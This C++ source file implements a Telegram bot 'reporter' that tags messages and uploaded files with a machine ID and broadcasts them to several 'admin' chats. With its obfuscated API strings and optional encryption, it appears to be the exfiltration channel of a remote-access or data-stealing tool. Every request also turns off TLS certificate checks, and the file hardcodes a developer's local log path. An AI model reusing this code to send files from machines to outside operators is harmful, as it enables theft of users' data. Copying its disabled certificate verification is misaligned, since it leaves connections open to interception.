#include "infrastructure/telegram/TelegramReporter.hpp"

#include <curl/curl.h>
#include <cctype>
#include <cstdio>

#include "domain/common/StringTable.hpp"

namespace nuub::infrastructure::telegram {

static size_t write_callback(char* ptr, size_t size, size_t nmemb, std::string* data) {
    data->append(ptr, size * nmemb);
    return size * nmemb;
}

TelegramReporter::TelegramReporter(std::string token, std::int64_t chat_id, std::string pc_id)
    : token_(std::move(token))
    , chat_id_(chat_id)
    , all_chat_ids_{chat_id}
    , pc_id_(std::move(pc_id))
{
    static std::once_flag curl_init;
    std::call_once(curl_init, []() { curl_global_init(CURL_GLOBAL_DEFAULT); });
}

TelegramReporter::TelegramReporter(std::string token, std::int64_t chat_id, std::string pc_id,
                                   const std::string& encryption_key)
    : token_(std::move(token))
    , chat_id_(chat_id)
    , all_chat_ids_{chat_id}
    , pc_id_(std::move(pc_id))
    , encryption_(encryption_key.empty() ? nullptr : std::make_unique<domain::EncryptedChannel>(encryption_key))
{
    static std::once_flag curl_init;
    std::call_once(curl_init, []() { curl_global_init(CURL_GLOBAL_DEFAULT); });
}

TelegramReporter::TelegramReporter(std::string token, std::vector<std::int64_t> chat_ids,
                                   std::string pc_id, const std::string& encryption_key)
    : token_(std::move(token))
    , chat_id_(chat_ids.empty() ? 0 : chat_ids[0])
    , all_chat_ids_(std::move(chat_ids))
    , pc_id_(std::move(pc_id))
    , encryption_(encryption_key.empty() ? nullptr : std::make_unique<domain::EncryptedChannel>(encryption_key))
{
    static std::once_flag curl_init;
    std::call_once(curl_init, []() { curl_global_init(CURL_GLOBAL_DEFAULT); });
}

std::string TelegramReporter::api_call(const std::string& method, const std::string& params) {
    std::lock_guard lock(curl_mutex_);

    std::string tg_api = domain::StringTable::get("tg_api");
    std::string url = tg_api + token_ + "/" + method;
    std::string response;

    CURL* curl = curl_easy_init();
    if (!curl) return {};

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    if (!params.empty()) {
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, params.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, params.size());
    }

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK) ? response : "";
}

void TelegramReporter::send_to_chat(std::int64_t chat_id, const std::string& text) {
    CURL* curl = curl_easy_init();
    if (!curl) return;

    std::string tg_api = domain::StringTable::get("tg_api");
    std::string url = tg_api + token_ + "/sendMessage";

    char* encoded = curl_easy_escape(curl, text.c_str(), static_cast<int>(text.size()));
    if (!encoded) { curl_easy_cleanup(curl); return; }
    std::string params = "chat_id=" + std::to_string(chat_id) +
                         "&text=" + encoded;
    curl_free(encoded);

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, params.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, params.size());

    // Discard response
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    std::string response_body;
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);

    CURLcode res = curl_easy_perform(curl);
    FILE* f = fopen("C:\\source\\C++\\NUUB-VERSION-2\\test_run\\curl_debug.log", "a");
    if (f) {
        if (res != CURLE_OK) {
            fprintf(f, "[CURL ERROR %d] %s\n", res, curl_easy_strerror(res));
        } else {
            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
            fprintf(f, "[HTTP %ld] %s\n", http_code, response_body.c_str());
        }
        fclose(f);
    }
    curl_easy_cleanup(curl);
}

void TelegramReporter::send_message(const std::string& text) {
    std::lock_guard lock(curl_mutex_);

    std::string full_text = "[" + pc_id_ + "] " + text;

    // Send to ALL admin chat IDs (broadcast)
    for (std::int64_t cid : all_chat_ids_) {
        send_to_chat(cid, full_text);
    }
}

bool TelegramReporter::send_file(const std::string& path, const std::string& caption) {
    std::lock_guard lock(curl_mutex_);

    std::string tg_api = domain::StringTable::get("tg_api");
    std::string url = tg_api + token_ + domain::StringTable::get("tg_send_doc");

    // Always send as document for maximum compatibility
    const char* field_name = "document";

    // Send file to ALL admin chat IDs
    bool all_ok = true;
    for (std::int64_t cid : all_chat_ids_) {
        CURL* curl = curl_easy_init();
        if (!curl) { all_ok = false; continue; }

        curl_mime* mime = curl_mime_init(curl);
        curl_mimepart* part;

        part = curl_mime_addpart(mime);
        curl_mime_name(part, "chat_id");
        curl_mime_data(part, std::to_string(cid).c_str(), CURL_ZERO_TERMINATED);

        part = curl_mime_addpart(mime);
        curl_mime_name(part, "document");
        curl_mime_filedata(part, path.c_str());
        auto name_pos = path.rfind('\\');
        if (name_pos == std::string::npos) name_pos = path.rfind('/');
        if (name_pos == std::string::npos) name_pos = 0; else name_pos++;
        curl_mime_filename(part, path.c_str() + name_pos);

        part = curl_mime_addpart(mime);
        curl_mime_name(part, "caption");
        std::string full_caption = "[" + pc_id_ + "] " + caption;
        curl_mime_data(part, full_caption.c_str(), CURL_ZERO_TERMINATED);

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);

        // Capture response for debugging
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        std::string response;
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        CURLcode res = curl_easy_perform(curl);

        // Log result
        FILE* f = fopen("C:\\source\\C++\\NUUB-VERSION-2\\test_run\\curl_debug.log", "a");
        if (f) {
            if (res != CURLE_OK) {
                fprintf(f, "[SEND_FILE ERROR %d] %s\n", res, curl_easy_strerror(res));
            } else {
                fprintf(f, "[SEND_FILE] %s\n", response.c_str());
            }
            fclose(f);
        }

        curl_mime_free(mime);
        curl_easy_cleanup(curl);

        if (res != CURLE_OK) all_ok = false;
    }

    return all_ok;
}

} // namespace nuub::infrastructure::telegram
